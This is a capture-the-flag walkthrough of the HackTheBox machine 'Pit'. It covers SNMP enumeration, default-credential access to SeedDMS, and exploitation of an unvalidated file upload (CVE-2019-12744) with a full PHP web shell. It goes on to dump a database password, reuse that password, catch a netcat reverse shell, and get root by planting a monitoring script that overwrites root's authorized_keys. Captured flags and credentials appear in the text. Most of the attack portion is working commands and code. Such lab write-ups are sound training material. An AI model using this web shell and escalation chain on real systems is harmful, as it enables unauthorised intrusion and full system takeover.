# Scan

```bash
ghost@localhost [13:48:41] [~/Documents/hacking/tj-null-boxes/pit] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.10.241:22
Open 10.10.10.241:80
Open 10.10.10.241:9090

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 6fc3408f6950695a57d79c4e7b1b9496 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9CvWa9xl1PXPQEI4X8UIfiDKduW+NhC0tRtfKzBSIR0XE+n2MjNCLM6pAR4xwhPZcpkXQmwurayT3OOHPV5QpOdSfzp0Zv56sBn3FmYe9j6fuhRFFL2x6Q8NfHOFkd4tAwkcCB1EebD0S/1ajB+TO6WeMOIHEU9HAAyg2LDzUKh0pzfFdK2MQHzKrGcFe3kOalz/dRJApa9wzUgq6iDbQvstDucPFLmvu8Y4YKFg1trKnf4Z2kopSUn0kKOxBROddoKOBdTyE309PF1b/Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr/NwWDsVQwHgCf1M7EZ23Uxww/qE6vRWbHStc6gM=
|   256 c26ff8aba12083d160abcf632dc865b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVAa/9rmFNvMuiMvBTPWhPq2+b5apFURHdxW2S5Q=
|   256 6b656ca692e5cc76175a2f9ae750c350 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack nginx 1.14.1
|_http-server-header: nginx/1.14.1
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden
9090/tcp open  ssl/zeus-admin? syn-ack
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US/organizationalUnitName=ca-5763051739999573755
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-16T23:29:12
| Not valid after:  2030-06-04T16:09:12
| MD5:   01464fba4de85bef0331e57e41b4a8ae
| SHA-1: 29f2edc37ae90c252a9d3feb3d90bde6dfd3eee5
| -----BEGIN CERTIFICATE-----
| MIIEpjCCAo6gAwIBAgIISl2h4yex5dEwDQYJKoZIhvcNAQELBQAwbzELMAkGA1UE
| BhMCVVMxKTAnBgNVBAoMIDRjZDkzMjk1MjMxODRiMGVhNTJiYTBkMjBhMWE2Zjky
| MR8wHQYDVQQLDBZjYS01NzYzMDUxNzM5OTk5NTczNzU1MRQwEgYDVQQDDAtkbXMt
| cGl0Lmh0YjAeFw0yMDA0MTYyMzI5MTJaFw0zMDA2MDQxNjA5MTJaME4xCzAJBgNV
| BAYTAlVTMSkwJwYDVQQKDCA0Y2Q5MzI5NTIzMTg0YjBlYTUyYmEwZDIwYTFhNmY5
| MjEUMBIGA1UEAwwLZG1zLXBpdC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDZLaNRUf3BXYCd+Df9XZwMBmIwGzy/yX+9fPY6zGXYEYS7SeH9xZ7p
| GTUQMfk30Olb7rzftCKx9xSMHyoCJIAWFeVDV9vxJbGaEqFRvKHPeqcpQbRAKoqL
| xWaqbDZCXsBtTVYEwpRHvJ/GoGEWAQSbP1zkHzvVBkHuXE7Sj0zlW5NaBjvG/wEe
| wAB6crwnIYoqC550cMPritvjLwijk9nhwaPJ462anhJR5vFBvkR4nqD3mhIytUOb
| YMsfVoI0FiXtlBdu1ApABxtIdQgkY94eRAaMTkQ4Je0a8G5PlRZ20xCdqHb3xIZV
| 1mphZehkUeN0MzgEloL5TX8Zab+LZW+ZAgMBAAGjZzBlMA4GA1UdDwEB/wQEAwIF
| oDAJBgNVHRMEAjAAMCcGA1UdEQQgMB6CC2Rtcy1waXQuaHRigglsb2NhbGhvc3SH
| BH8AAAEwHwYDVR0jBBgwFoAUc8ssOet8O2a3+F2If4eQixSV7PwwDQYJKoZIhvcN
| AQELBQADggIBAG8kou51q78wdzxiPejMv9qhWlBWW3Ly5TvAav07ATx8haldEHvT
| LlFNGPDFAvJvcKguiHnGrEL9Im5GDuzi31V4fE5xjzWJdkepXasK7NzIciC0IwgP
| 7G1j11OUJOt9pmDRu2FkTHsSdr5b57P4uXS8rRF5lLCEafuemk6ORXa07b9xSrhC
| 3pWl22RtVlTFQ3wX8OsY0O3w5UUz8T/ezhKYUoM/mYQu+ICTAltlX4xae6PGauCh
| uaOY+/dPtM17KfHSbnCS1ZnR0oQ4BXJuYNfOR/C59L5B7TWzaOx5n1TD6JHOzrDu
| LxjO0OTeFaBRXL/s2Z5zNPTpZVnHyKEmHr5ZObjR6drDGqXfShPq5y70RfE28Pxm
| VTCdK4MCqDkELIlXrxzHQ/IPC8pxho6WEQsY80xZ1nXbLshlymh6clgblOetToZT
| HObIkEoPBtszUssFmWSN5hd4JcuyqSbJhichYtFQRASb2I4jWdP831LPir+MCGQv
| iAnieBF8zYus7kboTwfXmBGUt6r6eNE1yr4ZXPxOZoWq2ob6aAeLp2mqif+jgUSk
| fiG9oiAoyXWxw5pLfYHxVQGY+rGbjOs8gCAxBaTPt6dCkHZy/nU8PNZtV6QC4OME
| LI/sYtmG8XENdQhsLM2sewOMvv5rgsZ8SlX05Bw8C1xuq5Rg1KewCjlY
|_-----END CERTIFICATE-----
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.93%T=SSL%I=7%D=10/24%Time=63562E78%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,E70,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type
SF::\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-D
SF:NS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-
SF:origin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x2
SF:0<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ut
SF:f-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\
SF:x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatD
SF:isplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.666666
SF:67;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20
SF:#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:
SF:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:
SF:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-
SF:weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ma
SF:rgin:\x200\x200\x2010p")%r(HTTPOptions,E70,"HTTP/1\.1\x20400\x20Bad\x20
SF:request\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-Enco
SF:ding:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Policy:\
SF:x20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\nCross-Origin-Re
SF:source-Policy:\x20same-origin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n
SF:<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</titl
SF:e>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"t
SF:ext/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\
SF:x20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fo
SF:nt-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20
SF:Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20li
SF:ne-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20margin:\x200\x200\x2010p");
```

From the SSL certificate, I found 2 domains

1. pit.htb
2. dms-pit.htb


# SNMP enumeration

Trying to perform SNMP with default version `2C` and default community string, `public` (a bit like password).

```bash
ghost@localhost [14:19:19] [~/Documents/hacking/tj-null-boxes/pit] [master *]
-> % snmpwalk -v2c -c public $IP . | tee snmp.output
...
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
...
```

From SNMP, found the following interesting result.

So using the username `michelle` to the url http://dms-pit.htb/seeddms51x/seeddms/, I try logging in with `michelle:michelle` and it logged in to the service.

From enumeration, found the change log. In change log, it attempts to fix the vulnerability by adding `.htaccess`. But if we look our nmap scan again, it is using `Nginx` not `Apache`. `.htaccess` does not exists in Nginx.

https://www.nginx.com/resources/wiki/start/topics/examples/likeapache-htaccess/

```bash
...
--------------------------------------------------------------------------------
                     Changes in version 5.1.11
--------------------------------------------------------------------------------
- fix for CVE-2019-12744 (Remote Command Execution through unvalidated
  file upload), add .htaccess file to data directory, better documentation
  for installing seeddms
...
```

When we do searchsploit, it is vulnerable to RCE.

```bash
ghost@localhost [15:19:23] [~/Documents/hacking/tj-null-boxes/pit] [master *]
-> % searchsploit seeddms
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
...
SeedDMS versions < 5.1.11 - Remote Command Execution                    | php/webapps/47022.txt
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results

...

PHP Backdoor Code:
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

The shell is uploaded under Michelle account as add document. Following the searchsploit note, I access the web shell at following URL.

http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=id

Using the web shell, I could not get reverse shell but I can traverse the system, and the following URL is to loook up the seeddms config.

view-source:http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=cat%20/var/www/html/seeddms51x/conf/settings.xml

From that, found MySQL database credential `seeddms:ied^ieY6xoquu`.

From `/etc/passwd` found a list of users that have login.

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:995:User for polkitd:/:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sssd:x:996:992:User for sssd:/:/sbin/nologin
chrony:x:995:991::/var/lib/chrony:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
michelle:x:1000:1000::/home/michelle:/bin/bash
setroubleshoot:x:994:990::/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:993:989:User for cockpit-ws:/nonexisting:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx:x:992:988:Nginx web server:/var/lib/nginx:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
cockpit-wsinstance:x:991:987:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rngd:x:990:986:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
```

# Cockpit to User (michelle)

With password from database, I tried logging into the cockpit via username `michelle:ied^ieY6xoquu` to check if there's password reuse and it works.

Using the web shell, I created a reverse shell with netcat.

```bash
ghost@localhost [23:42:33] [~/Documents/hacking/tj-null-boxes/pit] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.241] 35178
id
uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0

ls
user.txt

cat user.txt
7ee21f55ff7badef020dc004a9423ef7
```

The user `michelle` uses the same password for user login. However, this particular user does not have sudo permission.

```bash
[michelle@pit ~]$ sudo -l
sudo: unable to open /run/sudo/ts/michelle: Permission denied

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for michelle: 
sudo: unable to stat /var/db/sudo: Permission denied
Sorry, user michelle may not run sudo on pit.
```

From SNMP, I found out this script

```bash
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```

Looking what the script does with the shell

```bash
[michelle@pit bin]$ cat monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

It runs all the scripts that starts with `check` and ends with `sh` under `/usr/local/monitoring`.

What's interesting is that, the user `michelle` has no read but write permission.

```bash
[michelle@pit bin]$ cd /usr/local/monitoring/
[michelle@pit monitoring]$ ls
ls: cannot open directory '.': Permission denied

[michelle@pit monitoring]$ getfacl /usr/local/monitoring
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
```

It means we can write any scripts with `check*sh` and it will be executed by `monitoring`.

So the following code is added to `/usr/local/monitoring` to add our public key for root ssh.

```bash
[michelle@pit ~]$ vi /usr/local/monitoring/check_pwn3d.sh

#!/bin/bash
echo '<pit.pub>' > /root/.ssh/authorized_keys"**
```

After that do the SNMP walk again.

```bash
ghost@localhost [01:11:48] [~/Documents/hacking/tj-null-boxes/pit] [master *]
-> % ssh -i pit root@pit.htb
Web console: https://pit.htb:9090/

Last login: Mon Jul 26 06:58:15 2021
[root@pit ~]# cat /root/root.txt
9ac3c9172cc0eb710f4841a56e44f02a
```
